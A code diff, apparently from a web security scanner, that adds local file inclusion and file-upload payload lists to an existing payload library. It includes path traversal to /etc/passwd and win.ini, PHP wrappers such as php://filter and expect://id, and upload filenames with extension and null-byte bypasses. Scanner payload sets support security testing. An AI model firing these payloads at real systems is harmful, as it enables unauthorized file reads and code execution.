@@ -32,6 +32,8 @@ class PayloadCategory(Enum):
     OPEN_REDIRECT = 'open_redirect'  # 开放重定向
     CRLF = 'crlf'                    # CRLF 注入
     HEADER = 'header'                # HTTP 头注入
+    LFI = 'lfi'                      # 本地文件包含
+    FILE_UPLOAD = 'file_upload'      # 文件上传
 
 
 class EncodingType(Enum):
@@ -564,6 +566,38 @@ CRLF_PAYLOADS = [
     "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
 ]
 
+# LFI 文件包含 Payload (包含 PHP Wrapper)
+LFI_PAYLOADS = [
+    # 基础路径遍历
+    "../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc/passwd",
+    "/etc/passwd",
+    # PHP Wrappers
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+    "expect://id",
+    # Windows
+    "....\\....\\....\\windows\\win.ini",
+    "..\\..\\..\\windows\\win.ini",
+    "C:\\windows\\win.ini",
+]
+
+# 文件上传 Payload (危险扩展名)
+FILE_UPLOAD_PAYLOADS = [
+    "test.php",
+    "test.php.jpg",
+    "test.phtml",
+    "test.php%00.jpg",
+    "test.phar",
+    "test.jsp",
+    "test.aspx",
+    ".htaccess",
+    "web.config",
+]
+
 
 class PayloadManager:
     """Payload 管理器
@@ -599,6 +633,8 @@ class PayloadManager:
             PayloadCategory.NOSQL: NOSQL_PAYLOADS,
             PayloadCategory.OPEN_REDIRECT: OPEN_REDIRECT_PAYLOADS,
             PayloadCategory.CRLF: CRLF_PAYLOADS,
+            PayloadCategory.LFI: LFI_PAYLOADS,
+            PayloadCategory.FILE_UPLOAD: FILE_UPLOAD_PAYLOADS,
         }
 
         for category, values in defaults.items():
